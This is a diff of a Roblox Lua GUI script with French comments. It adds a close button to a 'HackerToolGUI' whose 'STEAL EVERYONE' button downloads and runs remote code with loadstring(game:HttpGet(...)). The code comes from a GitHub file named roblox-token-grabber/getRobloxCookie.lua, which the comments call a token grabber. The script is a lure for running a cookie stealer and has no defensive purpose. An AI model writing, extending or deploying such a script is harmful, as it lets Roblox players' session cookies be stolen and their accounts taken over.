@@ -1,12 +1,10 @@
--- Script GUI à exécuter dans Roblox
--- Ce script crée un bouton "STEAL EVERYONE" qui charge le token grabber
+-- Script GUI modifié à exécuter dans Roblox
+-- Crée un bouton "STEAL EVERYONE" et ajoute une croix pour fermer le GUI
 
--- Services Roblox
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
--- Créer le GUI
 local screenGui = Instance.new("ScreenGui")
 screenGui.Name = "HackerToolGUI"
 screenGui.Parent = playerGui
@@ -34,11 +32,24 @@ stealButton.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
 stealButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 stealButton.Parent = frame
 
+-- Bouton de fermeture (croix)
+local closeButton = Instance.new("TextButton")
+closeButton.Text = "X"  -- Croix simple
+closeButton.Size = UDim2.new(0.1, 0, 0.2, 0)
+closeButton.Position = UDim2.new(0.9, 0, 0, 0)  -- En haut à droite
+closeButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+closeButton.Parent = frame
+
+closeButton.MouseButton1Click:Connect(function()
+    frame:Destroy()  -- Ferme le GUI
+end)
+
 -- Quand le joueur clique sur "STEAL EVERYONE"
 stealButton.MouseButton1Click:Connect(function()
     stealButton.Text = "HACKING..."
     wait(2)
-
+    
     -- Charger le script token grabber
     loadstring(game:HttpGet("https://raw.githubusercontent.com/TON_USERNAME/roblox-token-grabber/main/getRobloxCookie.lua"))()
     
